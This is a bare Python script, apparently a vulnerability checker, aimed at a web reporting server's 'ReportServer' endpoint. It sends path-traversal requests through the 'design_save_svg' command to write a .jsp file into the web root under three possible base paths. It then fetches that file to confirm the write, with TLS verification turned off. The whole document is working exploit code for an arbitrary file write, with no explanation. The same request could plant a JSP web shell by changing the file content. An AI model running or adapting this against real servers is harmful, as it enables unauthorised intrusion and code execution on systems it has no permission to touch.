import requests,re,urllib3
from time import time
from json import dumps
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(url):
	try:
		head={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
		  'Content-Type':'text/xml;charset=UTF-8'}
		randnum=str(time()).split('.')[1]
		data={"__CONTENT__":randnum,"__CHARSET__":"UTF-8"}
		r=requests.post(url+'WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/a.svg.jsp',headers=head,data=dumps(data),verify=False,timeout=5)
		r=requests.get(url+'WebReport/a.svg.jsp')
		if randnum in r.text:
			r0=True
		else:
			r0=False
	except:
		r0=False
	try:
		head={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
		  'Content-Type':'text/xml;charset=UTF-8'}
		randnum=str(time()).split('.')[1]
		data={"__CONTENT__":randnum,"__CHARSET__":"UTF-8"}
		r=requests.post(url+'report/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../report/a.svg.jsp',headers=head,data=dumps(data),verify=False,timeout=5)
		r=requests.get(url+'report/a.svg.jsp')
		if randnum in r.text:
			r1=True
		else:
			r1=False
	except:
		r1=False
	try:
		head={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
		  'Content-Type':'text/xml;charset=UTF-8'}
		randnum=str(time()).split('.')[1]
		data={"__CONTENT__":randnum,"__CHARSET__":"UTF-8"}
		r=requests.post(url+'ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../a.svg.jsp',headers=head,data=dumps(data),verify=False,timeout=5)
		r=requests.get(url+'a.svg.jsp')
		if randnum in r.text:
			r2=True
		else:
			r2=False
	except:
		r2=False
	if r0 or r1 or r2:	
		return True
	else:
		return False

